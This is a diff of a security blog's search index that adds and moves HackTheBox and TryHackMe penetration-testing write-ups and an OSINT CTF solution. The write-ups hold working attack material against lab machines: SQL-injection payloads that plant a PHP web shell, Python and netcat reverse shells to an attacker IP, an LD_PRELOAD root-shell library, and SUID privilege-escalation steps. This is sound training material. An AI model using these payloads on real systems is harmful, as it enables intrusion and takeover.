@@ -302,7 +302,7 @@
 <h3 id="cartesian-2"><a href="#cartesian-2" class="headerlink" title="cartesian-2"></a>cartesian-2</h3><ul>
 <li>solver Elliot_404<br>上LinkedIn搜尋Terrence Descartes，會看到一個跟前面Instagram帳號同樣頭像的，點下去<br><a href="https://www.linkedin.com/in/terrence-descartes-54642831a/">https://www.linkedin.com/in/terrence-descartes-54642831a/</a><br>查看第一則貼文的第二張照片，裡面有寫flag(2&#x2F;1)<br><img src="https://hackmd.io/_uploads/ryuHquo_C.jpg" alt="1721434962084"></li>
 </ul>
-<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#x74;&#x65;&#x72;&#x72;&#101;&#x6e;&#99;&#x65;&#x64;&#101;&#x73;&#99;&#97;&#x72;&#116;&#x65;&#x73;&#64;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#99;&#111;&#x6d;">&#x74;&#x65;&#x72;&#x72;&#101;&#x6e;&#99;&#x65;&#x64;&#101;&#x73;&#99;&#97;&#x72;&#116;&#x65;&#x73;&#64;&#x67;&#109;&#97;&#105;&#108;&#x2e;&#99;&#111;&#x6d;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
+<p>利用<a href="https://epieos.com/">epieos</a>搜尋<a href="mailto:&#116;&#101;&#x72;&#x72;&#x65;&#x6e;&#x63;&#101;&#100;&#x65;&#x73;&#99;&#97;&#x72;&#x74;&#x65;&#x73;&#64;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;">&#116;&#101;&#x72;&#x72;&#x65;&#x6e;&#x63;&#101;&#100;&#x65;&#x73;&#99;&#97;&#x72;&#x74;&#x65;&#x73;&#64;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;</a>(用姓名猜出來的)<br>Google Calendar右邊的連結點進去<br><a href="https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com">https://calendar.google.com/calendar/u/0/embed?src=terrencedescartes@gmail.com</a><br>題目說要觀察他去年夏天旅行，所以前往2023年6月，會看到SUMMER TRIP!!!，點下去就能看到flag(2&#x2F;2)了<br><img src="https://hackmd.io/_uploads/rkf8TdjdA.png" alt="screencapture-calendar-google-calendar-u-0-embed-2024-07-22-14_32_59"></p>
 <h3 id="cartesian-3"><a href="#cartesian-3" class="headerlink" title="cartesian-3"></a>cartesian-3</h3><ul>
 <li>solver Elliot_404<blockquote>
 <p><a href="http://cartesian.chal.imaginaryctf.org/">http://cartesian.chal.imaginaryctf.org/</a></p>
@@ -310,7 +310,7 @@
 </li>
 </ul>
 <ol>
-<li><p>What is your email?<br>A: <a href="mailto:&#116;&#x65;&#114;&#x72;&#101;&#110;&#99;&#101;&#x64;&#x65;&#115;&#99;&#97;&#x72;&#x74;&#101;&#115;&#64;&#x67;&#x6d;&#97;&#x69;&#x6c;&#46;&#x63;&#x6f;&#x6d;">&#116;&#x65;&#114;&#x72;&#101;&#110;&#99;&#101;&#x64;&#x65;&#115;&#99;&#97;&#x72;&#x74;&#101;&#115;&#64;&#x67;&#x6d;&#97;&#x69;&#x6c;&#46;&#x63;&#x6f;&#x6d;</a><br>用姓名去猜即可</p>
+<li><p>What is your email?<br>A: <a href="mailto:&#x74;&#101;&#114;&#114;&#101;&#110;&#x63;&#x65;&#x64;&#x65;&#x73;&#x63;&#97;&#114;&#116;&#101;&#115;&#64;&#x67;&#109;&#97;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#109;">&#x74;&#101;&#114;&#114;&#101;&#110;&#x63;&#x65;&#x64;&#x65;&#x73;&#x63;&#97;&#114;&#116;&#101;&#115;&#64;&#x67;&#109;&#97;&#x69;&#x6c;&#x2e;&#99;&#x6f;&#109;</a><br>用姓名去猜即可</p>
 </li>
 <li><p>On what day were you born? (YYYY-MM-DD)<br>A: 2001-01-18<br>此篇<a href="https://www.instagram.com/p/C9lkBOjxQCW/">Instagram貼文</a>是他的半歲生日慶祝文，用發文日期減去6個月後即是他的生日，年份的部分則在名稱中就透露了</p>
 </li>
@@ -1070,35 +1070,6 @@
       </tags>
   </entry>
   <entry>
-    <title>BoardLight Write Up on HackTheBox</title>
-    <url>/2024/06/02/board-htb/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Season 5我今天才上去看&#x3D; &#x3D;<br>這題都是基本技巧但我卡在提成root一小段時間 &#x3D;w&#x3D;  </p>
-<p>Attacker’s IP : 10.10.14.103<br>Victim’s IP : 10.10.11.11<br>Victim’s Host : board.htb  </p>
-<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.11.11 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
-<p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/SJ422-q4R.png" alt="image">  </p>
-<p>很正常地開了 port 22的ssh和port 80的web服務  </p>
-<h4 id="subdomain-enumeration"><a href="#subdomain-enumeration" class="headerlink" title="subdomain enumeration"></a>subdomain enumeration</h4><p><strong>command:</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -w ~/wordlist/subdomains.txt -u <span class="string">&quot;http://devvortex.htb/&quot;</span> -H <span class="string">&quot;Host: FUZZ.devvortex.htb&quot;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://hackmd.io/_uploads/BJG10YklC.png" alt="image">  </p>
-<p>因為彈出來都是 7 lines，重新改一下指令：  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -w ~/wordlists/subdomains-10000.txt -u <span class="string">&quot;http://board.htb/&quot;</span> -H <span class="string">&quot;Host: FUZZ.board.htb&quot;</span> -hl 517</span><br></pre></td></tr></table></figure>
-<p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/HJUCnbqEA.png" alt="image">  </p>
-<p>找到子網域<code>crm.board.htb</code>  </p>
-<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2023-30253"><a href="#CVE-2023-30253" class="headerlink" title="CVE-2023-30253"></a>CVE-2023-30253</h4><p>進去網站後看到這個畫面：<br><img src="https://hackmd.io/_uploads/SJLV6-cVR.png" alt="image"><br>由版本號獲取<code>CVE-2023-30253</code><a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/blob/main/exploit.py">(link)</a>這個漏洞可能可以利用的資訊，嘗試猜測帳密admin&#x2F;admin成功，在端口 9001 監聽：  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 CVE-2023-30253.py http://crm.board.htb admin admin 10.10.14.103 9001</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://hackmd.io/_uploads/B1OoTZ54C.png" alt="image"><br>成功  </p>
-<h3 id="Previlige-Escalation"><a href="#Previlige-Escalation" class="headerlink" title="Previlige Escalation"></a>Previlige Escalation</h3><h4 id="conf-file-analyzation"><a href="#conf-file-analyzation" class="headerlink" title="conf file analyzation"></a>conf file analyzation</h4><p>根據linpeas提供的結果找到這個檔案<code>/var/www/html/crm.board.htb/htdocs/conf/conf.php</code><br>戳下去就有密碼了：<br><img src="https://hackmd.io/_uploads/BkBhCW5EC.png" alt="image"><br>嘗試拿它登入使用者<code>larissa</code>成功。  </p>
-<h4 id="SUID-LPE-with-CVE-2022-37706"><a href="#SUID-LPE-with-CVE-2022-37706" class="headerlink" title="SUID LPE with CVE-2022-37706"></a>SUID LPE with CVE-2022-37706</h4><p>再次看linpeas，注意SUID區LINPEAS未辨識的幾個檔案<br><img src="https://hackmd.io/_uploads/S1ErkMc40.png" alt="image"><br>上網GOOGLE就找到CVE PoC<br><a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh">https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh</a><br>RCE!!!<br><img src="https://hackmd.io/_uploads/B1aKkz5N0.png" alt="image">  </p>
-<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>累了，晚安世界</p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>HackTheBox</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2023 Cake CTF Write Up</title>
     <url>/2023/11/12/cakectf2023/</url>
     <content><![CDATA[<p>Team Name:WAN<br>Rank:142&#x2F;729<br>Link:<a href="https://2023.cakectf.com/teams/2247781930/">https://2023.cakectf.com/teams/2247781930/</a>  </p>
@@ -1151,6 +1122,35 @@ My arms were almost broken by brute forcing through this…</li>
         <tag>SQL Injection</tag>
         <tag>vtable</tag>
         <tag>Signature</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BoardLight Write Up on HackTheBox</title>
+    <url>/2024/06/02/board-htb/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>Season 5我今天才上去看&#x3D; &#x3D;<br>這題都是基本技巧但我卡在提成root一小段時間 &#x3D;w&#x3D;  </p>
+<p>Attacker’s IP : 10.10.14.103<br>Victim’s IP : 10.10.11.11<br>Victim’s Host : board.htb  </p>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h3 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h3><h4 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h4><p><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.11.11 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/SJ422-q4R.png" alt="image">  </p>
+<p>很正常地開了 port 22的ssh和port 80的web服務  </p>
+<h4 id="subdomain-enumeration"><a href="#subdomain-enumeration" class="headerlink" title="subdomain enumeration"></a>subdomain enumeration</h4><p><strong>command:</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -w ~/wordlist/subdomains.txt -u <span class="string">&quot;http://devvortex.htb/&quot;</span> -H <span class="string">&quot;Host: FUZZ.devvortex.htb&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/BJG10YklC.png" alt="image">  </p>
+<p>因為彈出來都是 7 lines，重新改一下指令：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -w ~/wordlists/subdomains-10000.txt -u <span class="string">&quot;http://board.htb/&quot;</span> -H <span class="string">&quot;Host: FUZZ.board.htb&quot;</span> -hl 517</span><br></pre></td></tr></table></figure>
+<p><strong>result:</strong><br><img src="https://hackmd.io/_uploads/HJUCnbqEA.png" alt="image">  </p>
+<p>找到子網域<code>crm.board.htb</code>  </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="CVE-2023-30253"><a href="#CVE-2023-30253" class="headerlink" title="CVE-2023-30253"></a>CVE-2023-30253</h4><p>進去網站後看到這個畫面：<br><img src="https://hackmd.io/_uploads/SJLV6-cVR.png" alt="image"><br>由版本號獲取<code>CVE-2023-30253</code><a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/blob/main/exploit.py">(link)</a>這個漏洞可能可以利用的資訊，嘗試猜測帳密admin&#x2F;admin成功，在端口 9001 監聽：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 CVE-2023-30253.py http://crm.board.htb admin admin 10.10.14.103 9001</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/B1OoTZ54C.png" alt="image"><br>成功  </p>
+<h3 id="Previlige-Escalation"><a href="#Previlige-Escalation" class="headerlink" title="Previlige Escalation"></a>Previlige Escalation</h3><h4 id="conf-file-analyzation"><a href="#conf-file-analyzation" class="headerlink" title="conf file analyzation"></a>conf file analyzation</h4><p>根據linpeas提供的結果找到這個檔案<code>/var/www/html/crm.board.htb/htdocs/conf/conf.php</code><br>戳下去就有密碼了：<br><img src="https://hackmd.io/_uploads/BkBhCW5EC.png" alt="image"><br>嘗試拿它登入使用者<code>larissa</code>成功。  </p>
+<h4 id="SUID-LPE-with-CVE-2022-37706"><a href="#SUID-LPE-with-CVE-2022-37706" class="headerlink" title="SUID LPE with CVE-2022-37706"></a>SUID LPE with CVE-2022-37706</h4><p>再次看linpeas，注意SUID區LINPEAS未辨識的幾個檔案<br><img src="https://hackmd.io/_uploads/S1ErkMc40.png" alt="image"><br>上網GOOGLE就找到CVE PoC<br><a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh">https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh</a><br>RCE!!!<br><img src="https://hackmd.io/_uploads/B1aKkz5N0.png" alt="image">  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>累了，晚安世界</p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>HackTheBox</tag>
       </tags>
   </entry>
   <entry>
@@ -1935,6 +1935,28 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
       </tags>
   </entry>
   <entry>
+    <title>LD_PRELOAD and Mongo Notes</title>
+    <url>/2023/11/27/ld-preload/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>I learned these from <a href="https://tryhackme.com/room/road">Road on TryHackMe</a> today  </p>
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><h3 id="Mongo-DB"><a href="#Mongo-DB" class="headerlink" title="Mongo DB"></a>Mongo DB</h3><p>It usually runs on port <code>27017</code>  </p>
+<h4 id="payloads"><a href="#payloads" class="headerlink" title="payloads(?):"></a>payloads(?):</h4><p><strong>Look for working services</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ss -tulnp</span><br></pre></td></tr></table></figure>
+<p><strong>MongoDB</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*show databases*/</span><br><span class="line">show db</span><br><span class="line">/*switch to a database*/</span><br><span class="line">use backup # In case the db name is backup</span><br><span class="line">/*list tables*/</span><br><span class="line">show collections</span><br><span class="line">/*read contents in a table*/</span><br><span class="line">db.user.find() # In case the table name is user</span><br></pre></td></tr></table></figure>
+
+<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>LD_PRELOAD is a function allows any program to share libraries.  </p>
+<h4 id="payloads-1"><a href="#payloads-1" class="headerlink" title="payloads:"></a>payloads:</h4><p><strong>shell.c</strong>  </p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line"> unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line"> setgid(<span class="number">0</span>);</span><br><span class="line"> setuid(<span class="number">0</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><strong>library compilation</strong><br><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code><br><strong>add LD_PRELOAD with sudo</strong><br><code>sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility</code><br>In case of sudo result like this:<br><img src="https://hackmd.io/_uploads/ByMeS7GHa.png" alt="image">  </p>
+<p><code>env_keep+=LD_PRELOAD</code>  </p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>LD_PRELOAD</tag>
+        <tag>MongoDB</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>LoTuX CTF WriteUp-Crypto</title>
     <url>/2023/09/20/lotuxctf-crypto/</url>
     <content><![CDATA[<h1 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h1><p>After I written the web writeups for it, it’s time to have some cryptography~<br><a href="http://lotuxctf.com:20003/4310.jpg">LoTuXCTF.com</a>  </p>
@@ -2080,28 +2102,6 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>loTuX CTF</tag>
         <tag>RCE</tag>
         <tag>backdoor</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>LD_PRELOAD and Mongo Notes</title>
-    <url>/2023/11/27/ld-preload/</url>
-    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>I learned these from <a href="https://tryhackme.com/room/road">Road on TryHackMe</a> today  </p>
-<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><h3 id="Mongo-DB"><a href="#Mongo-DB" class="headerlink" title="Mongo DB"></a>Mongo DB</h3><p>It usually runs on port <code>27017</code>  </p>
-<h4 id="payloads"><a href="#payloads" class="headerlink" title="payloads(?):"></a>payloads(?):</h4><p><strong>Look for working services</strong>  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ss -tulnp</span><br></pre></td></tr></table></figure>
-<p><strong>MongoDB</strong>  </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*show databases*/</span><br><span class="line">show db</span><br><span class="line">/*switch to a database*/</span><br><span class="line">use backup # In case the db name is backup</span><br><span class="line">/*list tables*/</span><br><span class="line">show collections</span><br><span class="line">/*read contents in a table*/</span><br><span class="line">db.user.find() # In case the table name is user</span><br></pre></td></tr></table></figure>
-
-<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>LD_PRELOAD is a function allows any program to share libraries.  </p>
-<h4 id="payloads-1"><a href="#payloads-1" class="headerlink" title="payloads:"></a>payloads:</h4><p><strong>shell.c</strong>  </p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line"> unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line"> setgid(<span class="number">0</span>);</span><br><span class="line"> setuid(<span class="number">0</span>);</span><br><span class="line"> system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><strong>library compilation</strong><br><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code><br><strong>add LD_PRELOAD with sudo</strong><br><code>sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility</code><br>In case of sudo result like this:<br><img src="https://hackmd.io/_uploads/ByMeS7GHa.png" alt="image">  </p>
-<p><code>env_keep+=LD_PRELOAD</code>  </p>
-]]></content>
-      <tags>
-        <tag>Pentesting</tag>
-        <tag>LD_PRELOAD</tag>
-        <tag>MongoDB</tag>
       </tags>
   </entry>
   <entry>
@@ -3253,6 +3253,42 @@ $0\ at\ 0x290$<br>$1\ at\ 0x2b0$<br>$T_{0x20}\rightarrow 2 \rightarrow 3$</li>
         <tag>TryHackMe</tag>
         <tag>lxd</tag>
         <tag>routingtableparser</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Year of the Dog on TryHackMe</title>
+    <url>/2024/09/10/thm-yearofthedog/</url>
+    <content><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>差Jellyfish就可以把year of系列打完ㄌ</p>
+<p>Attacker’s IP : 10.9.195.189<br>Victim’s IP : 10.10.178.204  </p>
+<h2 id="Write-up"><a href="#Write-up" class="headerlink" title="Write up"></a>Write up</h2><h2 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h2><h3 id="port-scan"><a href="#port-scan" class="headerlink" title="port scan"></a>port scan</h3><p><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rustscan -a 10.10.178.204 --<span class="built_in">ulimit</span> 5000 -- -sC -sV -Pn</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/ByXVPqT20.png" alt="image"><br>標準的ssh+http service</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="SQL-Injection-to-RCE"><a href="#SQL-Injection-to-RCE" class="headerlink" title="SQL Injection to RCE"></a>SQL Injection to RCE</h3><p>進到網站後他會給一個cookie，key是id，然後是根據那個顯示你在queue裡面ㄉnumber<br>試試看 SQLi &gt;w&lt;<br><img src="https://hackmd.io/_uploads/S15vO56nR.png" alt="image"><br>欸可以欸，調整一下payload去寫檔：  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT 1, &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; INTO OUTFILE &#x27;/var/www/html/exploit.php&#x27; -- -</span><br></pre></td></tr></table></figure>
+<p>然後就跳出<code>RCE Attempted</code>警告ㄌ…<br>換成hex試著繞：  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT 1, unhex(&#x27;3C3F7068702073797374656D28245F4745545B27636D64275D293B203F3E&#x27;) INTO OUTFILE &#x27;/var/www/html/exploit.php&#x27; -- -</span><br></pre></td></tr></table></figure>
+<p>成功get shell!!!<br><img src="https://hackmd.io/_uploads/SkoUTc6nC.png" alt="image"><br>彈reverse shell回本地：<br><code>https://10.10.178.204/exploit.php?cmd=export%20RHOST=%2210.9.195.189%22;export%20RPORT=9999;python3%20-c%20%27import%20sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(%22RHOST%22),int(os.getenv(%22RPORT%22))));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(%22sh%22)%27</code>  </p>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="www-data-to-dylan"><a href="#www-data-to-dylan" class="headerlink" title="www-data to dylan"></a>www-data to dylan</h3><p>透過列舉home找到dylan這個user，切進去<br>ls 一下找到 work_analysis，cat出來是很大一份ssh log檔(??)<br><img src="https://hackmd.io/_uploads/Bynoa9a3C.png" alt="image">  </p>
+<p>嘗試grep dylan相關的資訊：<br><code>cat work_analysis | grep dylan</code><br><img src="https://hackmd.io/_uploads/H11eRqpnR.png" alt="image"><br>成功找到密碼：Labr4d0rs4L1f3  </p>
+<h3 id="Gitea-Exploitation"><a href="#Gitea-Exploitation" class="headerlink" title="Gitea Exploitation"></a>Gitea Exploitation</h3><p>逛了一圈先<code>ss -tulnp</code>看了一下有哪些service<br><img src="https://hackmd.io/_uploads/B1XqOspnC.png" alt="image"><br>發現端口3000有開，curl下去：<br><img src="https://hackmd.io/_uploads/H1m3_o6hR.png" alt="image"><br>看的出來是一個Gitea Service<br>聽說過Gitea有蠻多問題，利用ssh port forward出來  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -L 3000:localhost:3000 dylan@10.10.178.204</span><br></pre></td></tr></table></figure>
+<p>可以在自己的localhost:3000造訪了，先用剛剛ssh的密碼password reuse，發現可以登入，但是需要2fa…<br>在主機跟目錄有個<code>/gitea</code>的路徑，進去之後再切到裡面的&#x2F;gitea路徑，應該就是Gitea的source fileㄌ，其中有個<code>./gitea.db</code>的資料庫，這邊使用最簡單暴力的方法處理：<br><del>python打開，將two_factor table直接刪除</del>  </p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sqlite3 <span class="keyword">import</span> *</span><br><span class="line">conn=connect(<span class="string">&#x27;./gitea.db&#x27;</span>)</span><br><span class="line">cursor=conn.cursor()</span><br><span class="line">cursor.execute(<span class="string">&#x27;SELECT name FROM sqlite_master WHERE type=&quot;table&quot;;&#x27;</span>)</span><br><span class="line">cursor.execute(<span class="string">&#x27;SELECT name FROM sqlite_master WHERE </span></span><br><span class="line"><span class="string">cursor.execute(&#x27;</span>DELETE FROM two_factor;<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">conn.commit()</span></span><br></pre></td></tr></table></figure>
+<p>接著就登入Gitea啦~<br><img src="https://hackmd.io/_uploads/rk4M9oTn0.png" alt="image"><br>參考<code>CVE-2020-14144</code>，在Gitea中，可以到Setting&#x2F;Hooks去撰寫一些腳本讓repo在觸發特定行為(如 pull上去)時被執行，也就RCEㄌ(但是看了下這台Gitea版本是1.13.0，理論上不能打(?)，不過試成功了)<br>彈回port 9999ㄅ  </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.9.195.189 9999 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+<h3 id="Docker-Mirror-Abuse"><a href="#Docker-Mirror-Abuse" class="headerlink" title="Docker Mirror Abuse"></a>Docker Mirror Abuse</h3><p><img src="https://hackmd.io/_uploads/r1fnjophA.png" alt="image"><br>sudo -l 一下發現自己已經是root，逛了一圈發現自己在Docker裡面，然後&#x2F;data是映射到主機&#x2F;gitea的，所以在Docker把主機的&#x2F;bin&#x2F;bash下載下來(本機開http server)，然後用chmod切suid，搬到Docker的gitea，最後到主機 .&#x2F;bash -p 就rootㄌ<br>主機：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /bin</span><br><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>
+<p>Docker：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget localhost:8080/bash</span><br><span class="line"><span class="built_in">chmod</span> 4755 bash</span><br><span class="line"><span class="built_in">mv</span> bash /data</span><br></pre></td></tr></table></figure>
+<p>主機：  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> gitea</span><br><span class="line">./bash -p</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/BJlYnsT3C.png" alt="image">  </p>
+<p>rooted!  </p>
+]]></content>
+      <tags>
+        <tag>Pentesting</tag>
+        <tag>TryHackMe</tag>
+        <tag>gitea</tag>
       </tags>
   </entry>
   <entry>
